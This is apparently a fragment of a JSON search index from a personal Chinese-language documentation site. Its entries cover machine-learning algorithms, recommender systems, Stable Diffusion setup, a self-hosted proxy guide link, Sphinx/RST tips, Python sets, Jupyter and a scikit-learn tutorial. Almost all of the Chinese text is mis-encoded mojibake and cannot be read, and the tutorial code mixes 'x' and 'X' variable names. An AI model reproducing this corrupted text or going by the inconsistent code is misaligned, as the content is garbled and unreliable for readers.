ä¸»è¦ç®—æ³•åŒ…æ‹¬ç¥ç»ç½‘ç»œã€æ”¯æŒå‘é‡æœºã€æœ€è¿‘é‚»å±…æ³•ã€æœ´ç´ è´å¶æ–¯æ³•ã€å†³ç­–æ ‘ç­‰ã€‚ æ— ç›‘ç£å­¦ä¹ ç®—æ³• (Unsupervised Algorithms) è¿™ç±»ç®—æ³•æ²¡æœ‰ç‰¹å®šçš„ç›®æ ‡è¾“å‡ºï¼Œç®—æ³•å°†æ•°æ®é›†åˆ†ä¸ºä¸åŒçš„ç»„ã€‚ å¼ºåŒ–å­¦ä¹ ç®—æ³• (Reinforcement Algorithms) å¼ºåŒ–å­¦ä¹ æ™®é€‚æ€§å¼ºï¼Œä¸»è¦åŸºäºå†³ç­–è¿›è¡Œè®­ç»ƒï¼Œç®—æ³•æ ¹æ®è¾“å‡ºç»“æœ(å†³ç­–)çš„æˆåŠŸæˆ–é”™è¯¯æ¥è®­ç»ƒè‡ªå·±ï¼Œ é€šè¿‡å¤§é‡ç»éªŒè®­ç»ƒä¼˜åŒ–åçš„ç®—æ³•å°†èƒ½å¤Ÿç»™å‡ºè¾ƒå¥½çš„é¢„æµ‹ã€‚ ç±»ä¼¼æœ‰æœºä½“åœ¨ç¯å¢ƒç»™äºˆçš„å¥–åŠ±æˆ–æƒ©ç½šçš„åˆºæ¿€ä¸‹ï¼Œé€æ­¥å½¢æˆå¯¹åˆºæ¿€çš„é¢„æœŸï¼Œ äº§ç”Ÿèƒ½è·å¾—æœ€å¤§åˆ©ç›Šçš„ä¹ æƒ¯æ€§è¡Œä¸ºã€‚ åœ¨è¿ç­¹å­¦å’Œæ§åˆ¶è®ºçš„è¯­å¢ƒä¸‹ï¼Œå¼ºåŒ–å­¦ä¹ è¢«ç§°ä½œ\"è¿‘ä¼¼åŠ¨æ€è§„åˆ’\"(approximate dynamic programmingï¼ŒADP)ã€‚ åå¤§æœºå™¨å­¦ä¹ ç®—æ³• çº¿æ€§å›å½’ç®—æ³• Linear Regression æ”¯æŒå‘é‡æœºç®—æ³•(Support Vector Machine,SVM) æœ€è¿‘é‚»å±…k-è¿‘é‚»ç®—æ³•(K-Nearest Neighbors,KNN) é€»è¾‘å›å½’ç®—æ³• Logistic Regression å†³ç­–æ ‘ç®—æ³• Decision Tree k-å¹³å‡ç®—æ³• K-Means éšæœºæ£®æ—ç®—æ³• Random Forest æœ´ç´ è´å¶æ–¯ç®—æ³• Naive Bayes é™ç»´ç®—æ³• Dimensional Reduction æ¢¯åº¦å¢å¼ºç®—æ³• Gradient Boosting å‚è€ƒ: Machine Learning: åå¤§æœºå™¨å­¦ä¹ ç®—æ³•","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-index.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-index.html"},{"title":"æ¨èç³»ç»Ÿ","text":"ååŒè¿‡æ»¤ ååŒè¿‡æ»¤æ­¥éª¤ æ”¶é›†ç”¨æˆ·åå¥½ ç”¨æˆ·è¡Œä¸ºå¦‚è¯„åˆ†/æŠ•ç¥¨/è½¬å‘/æ”¶è—/è¯„è®º æ‰¾åˆ°ç›¸ä¼¼ç”¨æˆ·/ç‰©å“ ç›¸ä¼¼åº¦è®¡ç®— æ¬§å‡ é‡Œå¾—è·ç¦» çš®å°”é€Šç›¸å…³ç³»æ•° åæ–¹å·® .. $$ cov(x, y) = frac {sum _{i=0} (x_i - bar x)(y_i - bar y)} {n-1} $$ çš®å°”é€Š ç›¸å…³ç³»æ•° .. $$ rho _x, _y = corr(x, y) = frac {cov(x, y)} {sigma _x sigma _y} = frac {E[(x - mu _x)(y - mu _y)]} {sigma _x sigma _y} $$ person ç›¸å…³ç³»æ•°æ˜¯ç”¨åæ–¹å·®é™¤ä»¥ä¸¤ä¸ªå˜é‡æ ‡å‡†å·®å¾—åˆ° Cosineç›¸ä¼¼åº¦ (ä½™å¼¦è·ç¦») è®¡ç®—æ¨è åˆ†ç±» åŸºäºç”¨æˆ·çš„ååŒè¿‡æ»¤ å­˜åœ¨é—®é¢˜ ç¨€ç–é—®é¢˜ ç”¨æˆ·é‡ç™¾ä¸‡è®¡ï¼Œé‡å¤§ äººå–„å˜ ï¼ˆå…¶å®å°±æ˜¯æœªæ¥çš„åˆ†å¸ƒæ— æ³•ä¿è¯äºç°åœ¨ä¸€è‡´ï¼‰ åŸºäºç‰©å“çš„ååŒè¿‡æ»¤ ç‰©å“ä¸ç‰©å“ç›¸ä¼¼åº¦ ç›¸å¯¹ä¼˜ç‚¹ è®¡ç®—æ€§èƒ½é«˜ï¼Œ é€šå¸¸ç”¨æˆ·æ•°é‡è¿œå¤§äºç‰©å“æ•°é‡ å¯é¢„å…ˆè®¡ç®—ä¿ç•™ï¼Œ ç‰©å“ä¸å–„å˜ éšè¯­ä¹‰æ¨¡å‹ åˆ†è§£ ç»„åˆ","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Recommended-system.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Recommended-system.html"},{"title":"æœºå™¨å­¦ä¹ ","text":"æ¨èç³»ç»Ÿ æœºå™¨å­¦ä¹ ç®—æ³•","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-index.html","loc":"/yq-doc-source-docs-AI-Machine-learning-index.html"},{"title":"å¼€æºæ¨¡å‹","text":"stable-diffusion","tags":"AI","url":"/yq-doc-source-docs-AI-Open-source-model-index.html","loc":"/yq-doc-source-docs-AI-Open-source-model-index.html"},{"title":"stable-diffusion","text":"å®‰è£…-å®˜æ–¹æ•™ç¨‹: https://github.com/AUTOMATIC1111/stable-diffusion-webui/wiki æˆ‘æ˜¯Nå¡: å…ˆå»ä¸‹è½½åŒ…: https://github.com/AUTOMATIC1111/stable-diffusion-webui/releases/download/v1.0.0-pre/sd.webui.zip è§£å‹åï¼Œå…ˆ update.bat å† run.bat","tags":"AI","url":"/yq-doc-source-docs-AI-Open-source-model-stable-diffusion.html","loc":"/yq-doc-source-docs-AI-Open-source-model-stable-diffusion.html"},{"title":"è‡ªå»ºä»£ç†","text":"å¯å‚è€ƒ: 66äº‘ç¾è¥¿9929 cn2-gia vps æ­å»ºXRAY +bbr ä¸ƒåˆä¸€è„šæœ¬ ç§’å¼€4K é€Ÿåº¦80000+ å®Œç¾ç§‘å­¦ä¸Šç½‘ æœ¬åœ°ä½ç½®: ../../resources/pdf/66äº‘ç¾è¥¿9929 cn2-gia vps æ­å»ºXRAY +bbr ä¸ƒåˆä¸€è„šæœ¬ ç§’å¼€4K é€Ÿåº¦80000+ å®Œç¾ç§‘å­¦ä¸Šç½‘ - èåœå¤´ç½‘åˆ›è”ç›Ÿ-èåœå¤´ç½‘åˆ›è”ç›Ÿ.pdf å¯ä½¿ç”¨æ­¤é¡¹ç›®: https://github.com/mack-a/v2ray-agent","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Self--built-agent.html","loc":"/yq-doc-source-docs-Chaotic-Self--built-agent.html"},{"title":"ä»£ç ","text":"ä½¿ç”¨ code æˆ–è€… code-block æˆ–è€… ç›´æ¥åŒå†’å· code code ä¸æ”¯æŒ linenosæ˜¾ç¤ºè¡Œå· code-block æ”¯æŒé€‰é¡¹: :emphasize-lines: ç‰¹åˆ«å¼ºè°ƒçš„è¡Œ(é«˜äº®), å¦‚ 3,5 :linenos: æ˜¯å¦ç”Ÿæˆè¡Œå· :lineno-start: èµ·å§‹è¡Œå·, å¦‚ 2 :dedent: å¿½ç•¥é«˜äº®æ˜¾ç¤ºè¡Œçš„é”™è¯¯ æ³¨è§£ ä¸Šè¿°éƒ¨åˆ†æŒ‡ä»¤å¯å‚è§äº: /docs/æ–‡æ¡£/rstæ ‡è®°è¯­è¨€/docè¯­æ³•æ¨¡å—/index literalinclude ä½¿ç”¨ literalinclude ç›´æ¥å¼•ç”¨æ–‡ä»¶å†…å®¹: .. literalinclude:: ../../../../../resources/code/example1.nsi :language: nsis åŒå†’å· å¦‚ä½¿ç”¨Pyæ‰§è¡Œæ–‡ä»¶: python xxx.py æºç : å¦‚ä½¿ç”¨Pyæ‰§è¡Œæ–‡ä»¶:: python xxx.py","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Code.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Code.html"},{"title":"è·¨æ–‡æ¡£å¼•ç”¨é—®é¢˜","text":"è™½ç„¶å¯ä»¥é€šè¿‡åœ¨ conf.py é…ç½®: extensions = [ 'sphinx.ext.autodoc', 'sphinx.ext.autosectionlabel', # å…è®¸ç›´æ¥refä½¿ç”¨æ ‡é¢˜å¼•ç”¨(å¦åˆ™éœ€è¦ç»™æ ‡é¢˜å®šä¹‰åˆ«å), # æ”¯æŒè·¨æ–‡æ¡£æ ‡é¢˜å¼•ç”¨(æ³¨æ„æ ‡é¢˜åœ¨å¤šä¸ªæ–‡æ¡£ä¸­ä¿æŒå”¯ä¸€), ] ä¸»è¦æ˜¯ sphinx.ext.autosectionlabel æ¥è§£å†³, ä½†æ˜¯ä¸å»ºè®®è¿™ä¹ˆåš, å› ä¸ºä¿ä¸é½ä»€ä¹ˆæ—¶å€™æœ‰ä¸ªæ ‡é¢˜å°±æ˜¯å¾—é‡å. ä½¿ç”¨ :doc: å€’æ˜¯å¯ä»¥è·¨åˆ°æ–‡æ¡£, ä½†æ˜¯ä¸æ”¯æŒæŒ‡å®šä½ç½®, æ‰€ä»¥è¿™ä¸ªé—®é¢˜å¾…è§£å†³å§.","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--document-reference-problem.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--document-reference-problem.html"},{"title":"è·¨æ–‡æ¡£è¶…é“¾æ¥(å¼•ç”¨)","text":"åœ¨ä¸€ä¸ªrstæ–‡æ¡£ä¸­, å°èŠ‚ä¼šè‡ªåŠ¨åŠ å…¥åˆ°æœ¬æ–‡æ¡£çš„è¶…é“¾æ¥ä¸­. è€Œè¦è·¨rstæ–‡æ¡£é¥®ç”¨å¦ä¸€ä¸ªrstæ–‡æœ¬çš„å°èŠ‚/é“¾æ¥, åªæœ‰ä½¿ç”¨: :ref:`xxx` è€Œé: xxx_ æŸ¥çœ‹å½“å‰å·²ç”Ÿæˆçš„æ ‡è®° æŸ¥çœ‹å½“å‰å·²ç”Ÿæˆçš„refæ ‡è®°, ä¸€èˆ¬éƒ½æ˜¯ç”Ÿæˆåœ¨ build/html/objects.inv: python -m sphinx.ext.intersphinx build/html/objects.inv","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--text-super-link-(quotation).html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--text-super-link-(quotation).html"},{"title":"è‡ªå®šä¹‰ä¸»é¢˜","text":"å…·ä½“æ€ä¹ˆè‡ªå®šä¹‰å¯ä»¥å‚è€ƒ: /docs/æ–‡æ¡£/rstæ ‡è®°è¯­è¨€/sphinxè‡ªå®šä¹‰ä¸»é¢˜ ä¸è¿‡æœ‰ä¸ªå‘ç‚¹æ˜¯, ä½¿ç”¨pipå®‰è£…çš„ä¸»é¢˜(æˆ‘ç›´æ¥æ˜¯å®‰è£…çš„pytorchçš„é‚£ä¸ªä¸»é¢˜). å¯èƒ½å†…å®¹æ¯”è¾ƒè€... å…·ä½“æ˜¯ä¸æ˜¯å¾ˆè€æ²¡ç»†çœ‹, ä¸è¿‡ç›´æ¥ä»pipå®‰è£…å¥½çš„ html é¡¹ç›®æ¥çœ‹, ä¸githubä¸Šçš„å†…å®¹æœ‰äº›å·®è·, æ¯”å¦‚ä»£ç ä¸ä¸€è‡´, jsæ–‡ä»¶ç¼ºå¤±ç­‰, å¯¼è‡´ä¸€äº›æŠ¥é”™. æ‰€ä»¥è¿™æ—¶å€™è¿˜æ˜¯ä½¿ç”¨ github ä¸Šé¢çš„æ¥å‚è€ƒå§.","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Custom-theme.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Custom-theme.html"},{"title":"æ–‡æ¡£è¶…é“¾æ¥","text":"ä½¿ç”¨: :doc:`xxx` è¯¦æƒ…è§: CR_RST_DOC æ­¤æŒ‡ä»¤åªå¯é“¾æ¥åˆ°æ–‡æ¡£","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Document-hyperlink.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Document-hyperlink.html"},{"title":"å†…åµŒPDFåˆ°æ–‡æ¡£ç›´æ¥æ˜¾ç¤º","text":"ä¸æ”¯æŒ...","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Embedded-PDF-to-documentation.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Embedded-PDF-to-documentation.html"},{"title":"targetè­¦å‘Š","text":"åœ¨åŒä¸€ç¯‡æ–‡ç« ä¸­å¦‚æœæœ‰ç›¸åŒçš„æ ‡é¢˜, å°±ä¼šæœ‰è­¦å‘Š. ä½†æ˜¯æœ‰æ—¶å€™å°±æ˜¯éœ€è¦... , æ¯”å¦‚: æ ‡é¢˜1 å°æ ‡é¢˜1 æ ‡é¢˜2 å°æ ‡é¢˜1 è²Œä¼¼å®˜æ–¹ä¸å»ºè®®è¿™ä¹ˆåš, åæ­£ç°åœ¨æœ€æ–°ç‰ˆè¿˜æ˜¯æœ‰è­¦å‘Š. åªæœ‰æš‚æ—¶å¿½ç•¥æˆ–è€…æ‹†åˆ†æˆå¤šä¸ªæ–‡æ¡£äº†.","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Target-warning.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Target-warning.html"},{"title":"set","text":"setçš„è¿ç®—: s = set([3,5,9,10,20,40]) #åˆ›å»ºä¸€ä¸ªæ•°å€¼é›†åˆ t = set([3,5,9,1,7,29,81]) #åˆ›å»ºä¸€ä¸ªæ•°å€¼é›†åˆ a = t | s # t å’Œ sçš„å¹¶é›† ,ç­‰ä»·äºt.union(s) b = t & s # t å’Œ sçš„äº¤é›† ,ç­‰ä»·äºt.intersection(s) c = t - s # æ±‚å·®é›†ï¼ˆé¡¹åœ¨tä¸­ï¼Œä½†ä¸åœ¨sä¸­ï¼‰ ,ç­‰ä»·äºt.difference(s) d = t &#94; s # å¯¹ç§°å·®é›†ï¼ˆé¡¹åœ¨tæˆ–sä¸­ï¼Œä½†ä¸ä¼šåŒæ—¶å‡ºç°åœ¨äºŒè€…ä¸­ï¼‰,ç­‰ä»·äºt.symmetric_difference(s) ä¸listçš„åŒºåˆ« listè§ /docs/åç«¯/python/å†…ç½®å‡½æ•°/list listæ˜¯åŠ¨æ€æ•°æ®, æŸ¥è¯¢æ—¶ä¼šéå†æ•´ä¸ªæ•°ç»„, æœ€åæƒ…å†µæŸ¥è¯¢ä¸º O(n) setæ˜¯hashè¡¨å®ç°, æŸ¥è¯¢å¤æ‚åº¦åªæœ‰ O(1)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-set.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-set.html"},{"title":"jupyter","text":"jupyter notebook æ˜¯ä¸€ä¸ªç½‘é¡µå½¢å¼çš„ç¼–è¾‘å™¨, æ”¯æŒ åœ¨ç½‘é¡µé¡µé¢ä¸­ç›´æ¥ç¼–å†™ä»£ç å’Œè¿è¡Œä»£ç ï¼Œ ä»£ç çš„è¿è¡Œç»“æœä¹Ÿä¼šç›´æ¥åœ¨ä»£ç å—ä¸‹æ˜¾ç¤ºçš„ç¨‹åºã€‚ å¦‚åœ¨ç¼–ç¨‹è¿‡ç¨‹ä¸­éœ€è¦ç¼–å†™è¯´æ˜æ–‡æ¡£ï¼Œå¯åœ¨åŒä¸€ä¸ªé¡µé¢ä¸­ç›´æ¥ç¼–å†™ï¼Œä¾¿äºä½œåŠæ—¶çš„è¯´æ˜å’Œè§£é‡Šã€‚ å®‰è£…: pip install jupyter å¯åŠ¨: jupyter notebook ç»“æœå°±æ˜¯åœ¨ å½“å‰ç›®å½• å¯åŠ¨ä¸€ä¸ª jupyter æœåŠ¡å™¨, ä¸€èˆ¬å°±ä¼šè‡ªåŠ¨è·³åˆ°æµè§ˆå™¨æ‰“å¼€, æˆ–è€…æ‰‹åŠ¨æ‰“å¼€ä¹Ÿè¡Œ: http://localhost:8888/tree æ³¨è§£ jupyterç”Ÿæˆçš„æ–‡ä»¶ä¸æ˜¯çº¯æ­£çš„ py æ–‡ä»¶ MacOSä¸‹å¿«æ·é”®: Enter åœ¨å½“å‰å•å…ƒæ ¼æ¢è¡Œ Command + Enter æ‰§è¡Œå½“å‰å•å…ƒæ ¼ Ctrl + Enter æ‰§è¡Œå½“å‰å•å…ƒæ ¼ Shift + Enter æ‰§è¡Œå½“å‰å•å…ƒæ ¼å¹¶æ–°å»ºä¸€ä¸ªå•å…ƒæ ¼ jupyter notebookæ”¯æŒçš„é€‰é¡¹ -h , --help å¸®åŠ©ä¿¡æ¯ --port <port_number> æŒ‡å®šå¯åŠ¨ç«¯å£ --no-browser å¯åŠ¨ä½†æ˜¯ä¸è‡ªåŠ¨æ‰“å¼€æµè§ˆå™¨ --generate-config ç”Ÿæˆé»˜è®¤é…ç½®æ–‡ä»¶","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jupyter.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jupyter.html"},{"title":"datasets","text":"load_wine å‚æ•° return_X_ybool, default=False å½“ä¸º True æ—¶, è¿”å› (data, target) è€Œä¸æ˜¯æ•´ä¸ªæ•°æ®å¯¹è±¡. targetåŠå¯¹åº”çš„åˆ†ç±»ç»“æœ as_framebool, default=False å½“ä¸º True æ—¶, æ•°æ®é›†æ˜¯ pandas çš„ DataFrame ç±»å‹, ä¼šè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„æ•°æ®ç±»å‹, targetäº¦æ˜¯. New in version 0.23. è¿”å›å€¼ dataBunch ç±»å­—å…¸å¯¹è±¡, å…·æœ‰ä»¥ä¸‹å±æ€§ data{ndarray, dataframe} of shape (178, 13) æ•°æ®çŸ©é˜µ. è‹¥ as_frame å‚æ•°ä¸º True, å°†ä¼šæ˜¯ pandas DataFrame ç±»å‹. target: {ndarray, Series} of shape (178,) æ•°æ®åˆ†ç±»ç»“æœ. è‹¥ as_frame å‚æ•°ä¸º True, å°†ä¼šæ˜¯ pandas Series ç±»å‹. feature_names: list æ•°æ®é›†çš„åˆ—åç§°. target_names: list ç›®æ ‡åˆ†ç±»çš„åç§°. frame: DataFrame of shape (178, 14) Only present when as_frame=True. DataFrame with data and target. New in version 0.23. DESCR: str æ•°æ®é›†æè¿° (data, target)tuple if return_X_y is True é»˜è®¤ä¸ºä¸¤ä¸ª ndarrays çš„å…ƒç»„ ç¬¬ä¸€ä¸ª shape æ˜¯ (178, 13), æ¯ä¸€è¡Œéƒ½è¡¨ç¤ºä¸€ä¸ªæ ·æœ¬ ç¬¬äºŒä¸ª shape æ˜¯ (178,), ä»£è¡¨å¯¹åº”åˆ†ç±». ä¸¾ä¾‹: >>> from sklearn.datasets import load_wine >>> data = load_wine() >>> data.target[[10, 80, 140]] array([0, 1, 2]) >>> list(data.target_names) ['class_0', 'class_1', 'class_2']","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-DataSets.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-DataSets.html"},{"title":"metrics","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Metrics.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Metrics.html"},{"title":"model_selection","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Model_selection.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Model_selection.html"},{"title":"impute","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-impure.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-impure.html"},{"title":"linear_model","text":"çº¿æ€§æ¨¡å‹ LogisticRegression","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-linear_model.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-linear_model.html"},{"title":"ç®€å•ä½¿ç”¨æ•™ç¨‹","text":"ä»¥ä¸‹å°†ä¼šä½¿ç”¨ Wine æ•°æ®é›†, å¯ä»¥ç›´æ¥ä»£ç ä¸‹è½½: from sklearn.datasets import load_wine X,y = load_wine(return_X_y=True) æ³¨è§£ wine ä½¿ç”¨å‡½æ•°ä¸‹è½½: sklearn.datasets.load_wine Estimatorsï¼ˆä¼°ç®—å™¨ï¼‰ Scitkit-learn åº“æä¾›äº†å¤šç§é¢„æ„å»ºç®—æ³•ï¼Œå¯ä»¥æ‰§è¡Œæœ‰ç›‘ç£å’Œæ— ç›‘ç£çš„æœºå™¨å­¦ä¹ ã€‚å®ƒä»¬é€šå¸¸è¢«ç§°ä¸ºä¼°ç®—å™¨ã€‚ ä¸ºé¡¹ç›®é€‰æ‹©ä½•ç§ä¼°è®¡å™¨å–å†³äºæˆ‘ä»¬æ‹¥æœ‰çš„æ•°æ®é›†å’Œæˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜ã€‚ Scitkit-learnå®˜æ–¹æ–‡æ¡£æä¾›äº†å¦‚ä¸‹æ‰€ç¤ºçš„å›¾è¡¨ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç¡®å®šå“ªç§ç®—æ³•é€‚åˆæˆ‘ä»¬çš„ä»»åŠ¡ã€‚ Scikit learnä¹‹æ‰€ä»¥èƒ½å¦‚æ­¤ç›´æ¥åœ°ä½¿ç”¨ï¼Œ æ˜¯å› ä¸ºæ— è®ºæˆ‘ä»¬ä½¿ç”¨çš„æ¨¡å‹æˆ–ç®—æ³•æ˜¯ä»€ä¹ˆï¼Œç”¨äºæ¨¡å‹è®­ç»ƒå’Œé¢„æµ‹çš„ä»£ç ç»“æ„éƒ½æ˜¯ç›¸åŒçš„ã€‚ å‡è®¾æˆ‘ä»¬æ­£åœ¨å¤„ç†ä¸€ä¸ªå›å½’é—®é¢˜ï¼Œå¸Œæœ›è®­ç»ƒä¸€ä¸ªçº¿æ€§å›å½’ç®—æ³•ï¼Œå¹¶ä½¿ç”¨å¾—åˆ°çš„æ¨¡å‹è¿›è¡Œé¢„æµ‹ã€‚ ä½¿ç”¨Scikit learn çš„ç¬¬ä¸€æ­¥æ˜¯è°ƒç”¨ logistic å›å½’ä¼°è®¡å™¨ å¹¶å°†å…¶å¦å­˜ä¸ºå¯¹è±¡ã€‚ ä¸‹é¢çš„ç¤ºä¾‹è°ƒç”¨è¯¥ç®—æ³•å¹¶å°†å…¶ä¿å­˜ä¸ºä¸€ä¸ªåä¸º lr çš„å¯¹è±¡: from sklearn.linear_model import LogisticRegression lr = LogisticRegression(max_iter=10000) ä½¿ç”¨lrç®—æ³•æ‹Ÿåˆæ•°æ®, è¿™é‡Œè®¾ç½®å‚æ•°10000æ˜¯å› ä¸º /docs/åç«¯/python/pythonä¸‰æ–¹åº“/scikit-learn/é—®é¢˜/lbfgs failed to converge ç„¶åä½¿ç”¨fitæ¥è®­ç»ƒæ•°æ®è·å–æ¨¡å‹: from sklearn.model_selection import train_test_split x_train, x_test, y_train, y_test = train_test_split(x, y, random_state=0) x_train, x_test, y_train, y_test model = lr.fit(x_train, y_train) ç”¨å¾—åˆ°çš„æ¨¡å‹, å®éªŒ æµ‹è¯•æ•°æ®é›† æ•ˆæœ: # æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨æ¨¡å‹å’Œé¢„æµ‹ï¼ˆï¼‰ æ–¹æ³•å¯¹ä»¥å‰ä¸å¯è§çš„æ•°æ®è¿›è¡Œé¢„æµ‹ã€‚ predictions = model.predict(x_test) predictions == y_test è¾“å‡º: array([ True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, False, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True]) å¦‚æœæˆ‘ä»¬ç°åœ¨è¦ä½¿ç”¨ Scitkit-learn æ‰§è¡Œä¸åŒçš„ä»»åŠ¡ï¼Œ æ¯”å¦‚è®­ç»ƒä¸€ä¸ªéšæœºæ£®æ—åˆ†ç±»å™¨ã€‚ä»£ç çœ‹èµ·æ¥éå¸¸ç›¸ä¼¼ï¼Œå¹¶ä¸”å…·æœ‰ç›¸åŒçš„æ­¥éª¤æ•°: from sklearn.ensemble import RandomForestClassifier rf = RandomForestClassifier() rf_model = rf.fit(X_train, y_train) rf_predictions = rf_model.predict(X_test) è¿™ç§ä¸€è‡´çš„ä»£ç ç»“æ„ä½¿å¾—å¼€å‘æœºå™¨å­¦ä¹ æ¨¡å‹éå¸¸ç›´æ¥ï¼Œå¹¶ä¸”è¿˜ç”Ÿæˆé«˜åº¦å¯è¯»å’Œå¯é‡å¤çš„ä»£ç ã€‚ é¢„å¤„ç† åœ¨å¤§å¤šæ•°å®é™…æœºå™¨å­¦ä¹ é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ•°æ®ä¸ä¸€å®šå‡†å¤‡å¥½è®­ç»ƒæ¨¡å‹ã€‚ å¾ˆå¯èƒ½é¦–å…ˆéœ€è¦æ‰§è¡Œä¸€äº›æ•°æ®é¢„å¤„ç†å’Œè½¬æ¢æ­¥éª¤ï¼Œ ä¾‹å¦‚å¤„ç†ç¼ºå¤±å€¼ã€å°†åˆ†ç±»æ•°æ®è½¬æ¢ä¸ºæ•°å­—æˆ–åº”ç”¨è¦ç´ ç¼©æ”¾ã€‚ Scikit-learn å…·æœ‰æ‰§è¡Œè¿™äº›é¢„å¤„ç†æ­¥éª¤çš„å†…ç½®æ–¹æ³•ã€‚ ä¾‹å¦‚ï¼ŒSimpleImputerï¼ˆï¼‰ ä¼šä½¿ç”¨æˆ‘ä»¬é€‰æ‹©çš„æ–¹æ³•æ¥å¡«å……ç¼ºå¤±çš„å€¼: from sklearn.impute import SimpleImputer imputer = SimpleImputer(strategy='mean') X_train_clean = imputer.fit(X_train) åœ¨ Scikit-learn å®˜æ–¹æ–‡æ¡£-é¢„å¤„ç† ä¸­åˆ—å‡ºäº†æ•°æ®é¢„å¤„ç†çš„å®Œæ•´é€‰é¡¹ æ•°æ®æ ‡å‡†åŒ–å’Œå½’ä¸€åŒ– code: from sklearn.preprocessing import StandardScaler # æ ‡å‡†åŒ– from sklearn.preprocessing import MinMaxScaler # å½’ä¸€åŒ– # æ ‡å‡†åŒ– ss = StandardScaler() X_scaled = ss.fit_transform(X_train) # ä¼ å…¥å¾…æ ‡å‡†åŒ–çš„æ•°æ® # å½’ä¸€åŒ– mm = MinMaxScaler() X_scaled = mm.fit_transform(X_train) æ¨¡å‹è¯„ä¼° è¡¡é‡æ¨¡å‹åœ¨é¢„æµ‹æ–°æ•°æ®æ–¹é¢çš„å¥½åç¨‹åº¦ æ­¤æ­¥éª¤ç§°ä¸ºæ¨¡å‹è¯„ä¼°ï¼Œæˆ‘ä»¬é€‰æ‹©çš„åº¦é‡å°†ç”±æˆ‘ä»¬å¸Œæœ›è§£å†³çš„ä»»åŠ¡æ¥ç¡®å®šã€‚ ä¾‹å¦‚ï¼Œé€šå¸¸åœ¨å›å½’é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©RMSEï¼Œè€Œå¯¹äºåˆ†ç±»ï¼Œåˆ™å¯ä»¥é€‰æ‹© F1 åˆ†æ•°ã€‚ æ‰€æœ‰ä¼°ç®—å™¨éƒ½åŒ…å«ä¸€ä¸ª scoreï¼ˆï¼‰æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›ä¸å®ƒä»¬æ‰§è¡Œçš„æœºå™¨å­¦ä¹ ä»»åŠ¡æœ€ç›¸å…³çš„é»˜è®¤æŒ‡æ ‡. æ¯”å¦‚ä¸Šé¢çš„model: model.score(x_test, y_test) # è¾“å‡º # 0.9777777777777777 Scikit-learn è¿˜æä¾›äº†ä¸€ç»„æŒ‡æ ‡å‡½æ•°ï¼Œè¿™äº›å‡½æ•°ä¸ºæ¨¡å‹æä¾›äº†æ›´è¯¦ç»†çš„è¯„ä¼°ã€‚ ä¾‹å¦‚ï¼Œå¯¹äºåˆ†ç±»ä»»åŠ¡ï¼Œåº“å…·æœ‰åˆ†ç±»æŠ¥å‘Šï¼Œæä¾›ç²¾åº¦ã€å¬å›ã€F1 è¯„åˆ†å’Œæ€»ä½“ç²¾åº¦ã€‚ åˆ†ç±»æŠ¥å‘Šä»£ç å’Œè¾“å‡ºå¦‚ä¸‹æ‰€ç¤º: from sklearn.metrics import classification_report print(classification_report(rf_predictions, y_test)) æ¨¡å‹ä¼˜åŒ– Scikit-learn åº“ä¸­çš„æ‰€æœ‰ä¼°ç®—å™¨éƒ½åŒ…å«ä¸€ç³»åˆ—å‚æ•°ï¼Œæœ‰å¤šä¸ªé€‰é¡¹ï¼Œ ä¸ºç‰¹å®šç®—æ³•é€‰æ‹©çš„å€¼éƒ½å°†å½±å“æœ€ç»ˆæ¨¡å‹çš„æ€§èƒ½ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ RandomForestClass 